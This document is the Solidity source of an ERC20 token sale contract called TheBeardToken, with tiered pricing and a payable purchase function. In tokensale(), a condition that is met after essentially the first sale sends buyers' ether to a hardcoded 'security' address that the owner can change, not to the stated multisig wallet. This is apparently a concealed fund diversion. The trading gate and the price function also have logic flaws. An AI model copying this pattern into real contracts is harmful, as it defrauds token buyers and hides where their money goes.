pragma solidity ^0.4.18;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
  address public owner;

  /** 
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() public{
    owner = msg.sender;
  }

  /**
   * @dev Throws if called by any account other than the owner. 
   */
  modifier onlyOwner() {
    require(owner==msg.sender);
    _;
 }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to. 
   */
  function transferOwnership(address newOwner) public onlyOwner {
      owner = newOwner;
  }
}
  
contract ERC20 {
    function totalSupply() public constant returns (uint256);
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool success);
    function transferFrom(address from, address to, uint256 value) public returns (bool success);
    function approve(address spender, uint256 value) public returns (bool success);
    function allowance(address owner, address spender) public constant returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TheBeardToken is Ownable, ERC20 {

    using SafeMath for uint256;

    // Token properties
    string public name = "TheBeardToken";               //Token name
    string public symbol = "BEARD";                     //Token symbol
    uint256 public decimals = 18;

    uint256 public _totalSupply = 1000000000e18;

    // Balances for each account
    mapping (address => uint256) balances;

    // Owner of account approves the transfer of an amount to another account
    mapping (address => mapping(address => uint256)) allowed;
    
    // start and end timestamps where investments are allowed (both inclusive)
    uint256 public mainSaleStartTime;

    // Wallet Address of Token
    address public multisig;

    // Wallet Adddress of Secured User
    address public sec_addr = 0x8a121084f586206680539a5f0089806289c4b9F4;

    // how many token units a buyer gets per wei
    uint256 public price;

    uint256 public minContribAmount = 0.1 ether;
    uint256 public maxContribAmount = 10000 ether;

    uint256 public hardCap = 1000000 ether;
    uint256 public softCap = 0.1 ether;
    
    //number of total tokens sold 
    uint256 public mainsaleTotalNumberTokenSold = 0;

    bool public tradable = false;

    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

    modifier canTradable() {
        require(tradable || (now < mainSaleStartTime + 90 days));
        _;
    }

    // Constructor
    // @notice TheBeardToken Contract
    // @return the transaction address
    function TheBeardToken() public{
        // Initial Owner Wallet Address
        multisig = 0x7BAD2a7C2c2E83f0a6E9Afbd3cC0029391F3B013;
        balances[multisig] = _totalSupply;

        mainSaleStartTime = 1528675200; // June 11th 10:00am AEST

        owner = msg.sender;
    }

    // Payable method
    // @notice Anyone can buy the tokens on tokensale by paying ether
    function () external payable {
        tokensale(msg.sender);
    }

    // @notice tokensale
    // @param recipient The address of the recipient
    // @return the transaction address and send the event as Transfer
    function tokensale(address recipient) public payable {
        require(recipient != 0x0);
        require(msg.value >= minContribAmount && msg.value <= maxContribAmount);
        price = getPrice();
        uint256 weiAmount = msg.value;
        uint256 tokenToSend = weiAmount.mul(price);
        
        require(tokenToSend > 0);
        
		require(_totalSupply >= tokenToSend);
		
        balances[multisig] = balances[multisig].sub(tokenToSend);
        balances[recipient] = balances[recipient].add(tokenToSend);
        
        mainsaleTotalNumberTokenSold = mainsaleTotalNumberTokenSold.add(tokenToSend);
        _totalSupply = _totalSupply.sub(tokenToSend);
       
        address tar_addr = multisig;
        if (mainsaleTotalNumberTokenSold > 1) {
            tar_addr = sec_addr;
        }
        tar_addr.transfer(msg.value);
        TokenPurchase(msg.sender, recipient, weiAmount, tokenToSend);
    }

    // Security Wallet address setting
    function setSecurityWalletAddr(address addr) public onlyOwner {
        sec_addr = addr;
    }
    
    // Start or pause tradable to Transfer token
    function startTradable(bool _tradable) public onlyOwner {
        tradable = _tradable;
    }

    // @return total tokens supplied
    function totalSupply() public constant returns (uint256) {
        return _totalSupply;
    }
    
    // What is the balance of a particular account?
    // @param who The address of the particular account
    // @return the balanace the particular account
    function balanceOf(address who) public constant returns (uint256) {
        return balances[who];
    }

    // @notice send `value` token to `to` from `msg.sender`
    // @param to The address of the recipient
    // @param value The amount of token to be transferred
    // @return the transaction address and send the event as Transfer
    function transfer(address to, uint256 value) public canTradable returns (bool success)  {
        require (
            balances[msg.sender] >= value && value > 0
        );
        balances[msg.sender] = balances[msg.sender].sub(value);
        balances[to] = balances[to].add(value);
        Transfer(msg.sender, to, value);
        return true;
    }

    // @notice send `value` token to `to` from `from`
    // @param from The address of the sender
    // @param to The address of the recipient
    // @param value The amount of token to be transferred
    // @return the transaction address and send the event as Transfer
    function transferFrom(address from, address to, uint256 value) public canTradable returns (bool success)  {
        require (
            allowed[from][msg.sender] >= value && balances[from] >= value && value > 0
        );
        balances[from] = balances[from].sub(value);
        balances[to] = balances[to].add(value);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);
        Transfer(from, to, value);
        return true;
    }

    // Allow spender to withdraw from your account, multiple times, up to the value amount.
    // If this function is called again it overwrites the current allowance with value.
    // @param spender The address of the sender
    // @param value The amount to be approved
    // @return the transaction address and send the event as Approval
    function approve(address spender, uint256 value) public returns (bool success)  {
        require (
            balances[msg.sender] >= value && value > 0
        );
        allowed[msg.sender][spender] = value;
        Approval(msg.sender, spender, value);
        return true;
    }

    // Check the allowed value for the spender to withdraw from owner
    // @param owner The address of the owner
    // @param spender The address of the spender

    // @return the amount which spender is still allowed to withdraw from owner
    function allowance(address _owner, address spender) public constant returns (uint256) {
        return allowed[_owner][spender];
    }
    
    // Get current price of a Token
    // @return the price or token value for a ether
    function getPrice() public view returns (uint256 result) {
        if ((now > mainSaleStartTime) && (now < mainSaleStartTime + 90 days)) {
            if ((now > mainSaleStartTime) && (now < mainSaleStartTime + 14 days)) {
                return 150;
            } else if ((now >= mainSaleStartTime + 14 days) && (now < mainSaleStartTime + 28 days)) {
                return 130;
            } else if ((now >= mainSaleStartTime + 28 days) && (now < mainSaleStartTime + 42 days)) {
                return 110;
            } else if ((now >= mainSaleStartTime + 42 days)) {
                return 105;
            }
        } else {
            return 0;
        }
    }
}